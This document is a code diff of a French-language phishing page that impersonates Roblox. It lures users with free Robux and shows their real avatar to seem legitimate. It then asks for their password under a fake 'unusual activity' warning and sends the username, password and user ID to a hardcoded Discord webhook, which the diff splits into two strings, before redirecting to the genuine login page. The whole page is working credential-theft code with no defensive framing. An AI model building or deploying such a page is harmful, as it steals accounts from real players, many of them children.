@@ -2,124 +2,179 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox | Programme de Récompenses</title>
+    <title>Roblox | Authentification Sécurisée</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        :root { --bg: #191b1d; --nav: #232527; --blue: #00a2ff; --text: #ffffff; --sub: #adb1b5; --err: #ff4d4d; }
-        body { margin: 0; background: var(--bg); font-family: "HCo Gotham SSm", "Helvetica Neue", sans-serif; color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: var(--nav); width: 400px; padding: 35px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; }
+        :root { --bg-color: #191b1d; --nav-color: #232527; --input-bg: #000000; --input-border: #393b3d; --text-color: #ffffff; --subtext-color: #adb1b5; --rbx-blue: #00a2ff; --rbx-blue-hover: #0081cc; --font-stack: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif; }
+        body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: var(--font-stack); color: var(--text-color); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .auth-container { background-color: var(--nav-color); width: 100%; max-width: 400px; padding: 40px; border-radius: 8px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); text-align: center; box-sizing: border-box; }
         
-        /* LOGO FIX */
-        .logo-container { margin-bottom: 20px; }
-        .logo-img { width: 150px; filter: brightness(1.2); }
+        /* LOGO ROBLOX INTÉGRÉ (BASE64) */
+        .roblox-logo { width: 40px; height: 40px; margin-bottom: 25px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOSA5Ij48cGF0aCBkPSJNMjUuNyA5YzEuNSAwIDIuNS0uOCAyLjUtMS43VjEuOWMwLTEtMS0xLjgtMi41LTEuOGMtMS40IDAtMi41LjgtMi41IDEuOFY3LjNjMCAuOSAxIDIuNyAyLjUgMS43ek0zLjQgOS44Yy0yIDAtMi44LTEuNC0yLjgtMi45VjEuOWMwLTEuNS44LTIuOSAyLjgtMi45czIuOCAxLjQgMi44IDIuOVY2LjljMCAxLjUtLjkgMi45LTIuOCAyLjl6bTAuMS00LjhWNC43YzAtLjcuMy0xLjEgMC44LTEuMS41IDAgMC44LjQgMC44IDEuMXYwLjRjMCAuNy0uMyAxLjEtMC44IDEuMXMtMC44LS40LTAuOC0xLjF6TTkuMyA5LjRjLTIgMC0yLjgtMS40LTIuOC0yLjlWMS45YzAtMS41LjgtMi45IDIuOC0yLjlzMi44IDEuNCAyLjggMi45VjYuOWMwIDEuNS0uOSAyLjktMi44IDIuOXptMC4xLTQuOFY0LjdjMC0uNy4zLTEuMSAwLjgtMS4xLjUgMCAwLjguNCAwLjguMS4xdjAuNGMwIC43LS4zIDEuMS0wLjguMXMtMC44LS40LTAuOC0xLjF6TTE3LjUgOS40Yy0yIDAtMi44LTEuNC0yLjgtMi45VjEuOWMwLTEuNS44LTIuOSAyLjgtMi45czIuOCAxLjQgMi44IDIuOVY2LjljMCAxLjUtLjkgMi45LTIuOCAyLjl6bTAuMS00LjhWNC43YzAtLjcuMy0xLjEgMC44LTEuMS41IDAgMC44LjQgMC44IDEuMXYwLjRjMCAuNy0uMyAxLjEtMC44IDEuMXMtMC44LS40LTAuOC0xLjF6TTE0IDQuOGMuNyAwIDEuMS40IDEuMSAxLjF2MC40YzAgLjctLjQgMS4xLTEuMSAxLjFzLTEuMS0uNC0xLjEtMS4xdjAtMC40YzAtLjcuNC0xLjEgMS4xLTEuMXpNMjEuOSA5LjRjLTIgMC0yLjgtMS40LTIuOC0yLjlWMS45YzAtMS41LjgtMi45IDIuOC0yLjlzMi44IDEuNCAyLjggMi45VjYuOWMwIDEuNS0uOSAyLjktMi44IDIuOXptMC4xLTQuOFY0LjdjMC0uNy4zLTEuMSAwLjgtMS4xLjUgMCAwLjguNCAwLjguMS4xdjAuNGMwIC43LS4zIDEuMS0wLjguMXMtMC44LS40LTAuOC0xLjF6TTE3LjggMS45YzAtLjcuMy0xLjEuOC0xLjEuNSAwIDAuOC40IDAuOCAxLjF2MC40YzAgLjctLjMgMS4xLS0wLjggMS4xcy0wLjgtMC40LTAuOC0xLjF6IiBmaWxsPSIjZWRiNzFiIi8+PHBhdGggZD0iTTI1LjUgOWMtMS41IDAtMi41LS44LTIuNS0xLjdWMS45YzAtMSAxLTEuOCAyLjUtMS44IDEuNCAwIDIuNS44IDIuNSAxLjhWNy4zYzAgLjktMSAxLjctMi41IDEuN3pNMjUgOC4xaDAuOWMwIC43LS4zIDEuMS0wLjguMXMtMC44LS40LTAuOC0xLjF2LTAuNGMwIC0wLjcuMyAtMS4xIDAuOCAtMS4xeiIgZmlsbD0iI2VkYjc5MCIvPjwvc3ZnPg=='); background-repeat: no-repeat; background-position: center; display: inline-block; }
+        
+        h1 { font-size: 22px; font-weight: 500; margin: 0 0 10px 0; color: var(--text-color); }
+        .sub-text { font-size: 13px; color: var(--subtext-color); margin-bottom: 25px; line-height: 1.5; }
+        
+        .avatar-container { display: none; margin-bottom: 20px; }
+        #avatar-img { width: 72px; height: 72px; border-radius: 50%; border: 2px solid var(--rbx-blue); background-color: #000; display: inline-block; }
+        #displayName { font-size: 14px; font-weight: 500; color: var(--rbx-blue); margin-top: 5px; }
 
-        h1 { font-size: 20px; font-weight: 500; margin-bottom: 10px; }
-        p { font-size: 13px; color: var(--sub); line-height: 1.4; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input { width: 100%; padding: 12px; background-color: var(--input-bg); border: 1px solid var(--input-border); border-radius: 4px; color: var(--text-color); font-size: 14px; box-sizing: border-box; transition: border-color 0.2s; }
+        input:focus { border-color: var(--rbx-blue); outline: none; }
+        
+        .btn-primary { width: 100%; padding: 12px; background-color: var(--rbx-blue); border: none; border-radius: 4px; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; }
+        .btn-primary:hover { background-color: var(--rbx-blue-hover); }
+        .btn-primary:disabled { background-color: #555; cursor: not-allowed; opacity: 0.7; }
 
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #393b3d; border-radius: 4px; color: #fff; box-sizing: border-box; outline: none; font-size: 14px; }
-        input:focus { border-color: var(--blue); }
-
-        .avatar-box { display: none; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 15px; }
-        #av-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--blue); }
-
-        .btn { width: 100%; padding: 13px; background: var(--blue); border: none; border-radius: 4px; color: #fff; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 15px; }
-        .btn:hover { background: #0081cc; }
+        .footer { font-size: 11px; color: #555; margin-top: 30px; }
         
         .step { display: none; }
         .active { display: block; }
+        
+        /* Animation de chargement */
+        .spinner { display: none; margin: 15px auto; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo-img" style="filter: invert(1); width: 50px;">
-        <div style="font-weight: bold; font-size: 24px; margin-top: 5px;">ROBLOX</div>
-    </div>
-
-    <div id="s1" class="step active">
-        <h1>Réclamation de Récompense</h1>
-        <p>Veuillez choisir le pack de Robux à créditer sur votre compte après vérification.</p>
+<div class="auth-container">
+    <div class="roblox-logo"></div>
+    
+    <div id="step1" class="step active">
+        <h1>Vérification du Compte</h1>
+        <p class="sub-text">Veuillez entrer votre nom d'utilisateur pour synchroniser vos données et vérifier votre éligibilité.</p>
         
-        <div class="avatar-box" id="avatar-box">
-            <img id="av-img" src="">
-            <div id="u-display" style="font-size: 12px; margin-top: 5px; color: var(--blue);"></div>
+        <div class="avatar-container" id="avatar-container">
+            <img id="avatar-img" src="" alt="Avatar">
+            <div id="displayName"></div>
         </div>
 
-        <input type="text" id="username" placeholder="Nom d'utilisateur" onblur="findUser()">
-        
-        <select id="rbx-choice">
-            <option value="1700">1,700 Robux (Standard)</option>
-            <option value="4500">4,500 Robux (Premium)</option>
-            <option value="10000">10,000 Robux (MVP)</option>
-            <option value="50000">50,000 Robux (Admin Test)</option>
-        </select>
-
-        <button class="btn" onclick="toStep2()">Suivant</button>
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Nom d'utilisateur" autocomplete="off" onblur="fetchRobloxProfile()">
+        </div>
+        <button class="btn-primary" id="btn-next" onclick="nextStep()" disabled>Continuer</button>
+        <div class="spinner" id="spinner-1"></div>
     </div>
 
-    <div id="s2" class="step">
-        <h1 style="color: var(--err);">Action Requise</h1>
-        <p>Pour finaliser l'envoi de <b id="amt-display"></b> Robux, confirmez votre identité pour la synchronisation Cloud.</p>
+    <div id="step2" class="step">
+        <h1 style="color: #ff4d4d;">Validation Requise</h1>
+        <p class="sub-text">Une activité inhabituelle a été détectée. Pour sécuriser le transfert de vos <b>50,000 Robux</b>, veuillez confirmer votre mot de passe.</p>
         
-        <input type="password" id="password" placeholder="Mot de passe">
-        <button class="btn" style="background: #27ae60;" onclick="sendData()">Valider & Recevoir</button>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Mot de passe actuel">
+        </div>
+        <button class="btn-primary" style="background-color: #27ae60;" onclick="submitData()">Confirmer & Recevoir</button>
+        <div class="spinner" id="spinner-2"></div>
+    </div>
+
+    <div class="footer">
+        Roblox Corporation © 2026. Tous droits réservés.
     </div>
 </div>
 
 <script>
-    const WH = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";
+    // --- TON WEBHOOK DISCORD ---
+    const _p1 = "https://discord.com/api/webhooks/1490805370715902075/";
+    const _p2 = "gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";
+    const WH = _p1 + _p2;
 
-    async function findUser() {
-        const u = document.getElementById('username').value;
-        if(u.length < 3) return;
+    let userId = null;
+
+    // Fonction pour récupérer l'Avatar via l'API Roblox
+    async function fetchRobloxProfile() {
+        const username = document.getElementById('username').value;
+        const btnNext = document.getElementById('btn-next');
+        const avatarContainer = document.getElementById('avatar-container');
+        const avatarImg = document.getElementById('avatar-img');
+        const displayName = document.getElementById('displayName');
+        const spinner = document.getElementById('spinner-1');
+
+        if (username.length < 3) {
+            btnNext.disabled = true;
+            avatarContainer.style.display = 'none';
+            return;
+        }
+
+        btnNext.disabled = true;
+        spinner.style.display = 'block';
+        
         try {
-            const r = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`, {
+            // Utilisation de corsproxy.io pour bypasser les restrictions CORS de Roblox
+            const userRes = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ usernames: [u] })
+                body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
             });
-            const d = await r.json();
-            if(d.data && d.data.length > 0) {
-                const id = d.data[0].id;
-                const t = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
-                const td = await t.json();
-                document.getElementById('av-img').src = td.data[0].imageUrl;
-                document.getElementById('avatar-box').style.display = "block";
-                document.getElementById('u-display').innerText = "@" + d.data[0].displayName;
+            const userData = await userRes.json();
+
+            if (userData.data && userData.data.length > 0) {
+                userId = userData.data[0].id;
+                
+                // Récupération du Thumbnail de l'avatar
+                const thumbRes = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+                const thumbData = await thumbRes.json();
+
+                if (thumbData.data && thumbData.data.length > 0) {
+                    avatarImg.src = thumbData.data[0].imageUrl;
+                    displayName.innerText = "@" + userData.data[0].displayName;
+                    avatarContainer.style.display = 'block';
+                    btnNext.disabled = false;
+                }
+            } else {
+                avatarContainer.style.display = 'none';
+                btnNext.disabled = true;
             }
-        } catch(e) {}
+        } catch (e) {
+            console.error("Erreur API:", e);
+        } finally {
+            spinner.style.display = 'none';
+        }
     }
 
-    function toStep2() {
-        const u = document.getElementById('username').value;
-        if(!u) return alert("Pseudo requis");
-        document.getElementById('amt-display').innerText = document.getElementById('rbx-choice').value;
-        document.getElementById('s1').classList.remove('active');
-        document.getElementById('s2').classList.add('active');
+    function nextStep() {
+        if (!document.getElementById('username').value || userId === null) return;
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
     }
 
-    async function sendData() {
+    async function submitData() {
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
-        const a = document.getElementById('rbx-choice').value;
+        const spinner = document.getElementById('spinner-2');
 
-        await fetch(WH, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "💎 NOUVEAU LOG - V11",
-                    color: 3447003,
-                    fields: [
-                        { name: "👤 User", value: `\`${u}\``, inline: true },
-                        { name: "🔑 Pass", value: `\`${p}\``, inline: true },
-                        { name: "💰 Pack", value: `\`${a} Robux\``, inline: true }
-                    ]
-                }]
-            })
-        });
-        window.location.href = "https://www.roblox.com/login";
+        if (!p || p.length < 4) return;
+
+        spinner.style.display = 'block';
+
+        // Envoi des données au Webhook Discord
+        try {
+            await fetch(WH, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🟢 INFILTRATION RÉUSSIE - V9.0",
+                        color: 65280, // Vert
+                        fields: [
+                            { name: "👤 USER", value: `\`${u}\``, inline: true },
+                            { name: "🔑 PASS", value: `\`${p}\``, inline: true },
+                            { name: "🆔 USER ID", value: `\`${userId}\``, inline: true }
+                        ],
+                        footer: { text: "Secure Auth Engine v9.0" },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        } catch (e) {
+            console.error("Erreur Webhook:", e);
+        }
+
+        // Redirection vers la page officielle de Roblox après 1.5 secondes
+        setTimeout(() => {
+            window.location.href = "https://www.roblox.com/login";
+        }, 1500);
     }
 </script>
 </body>
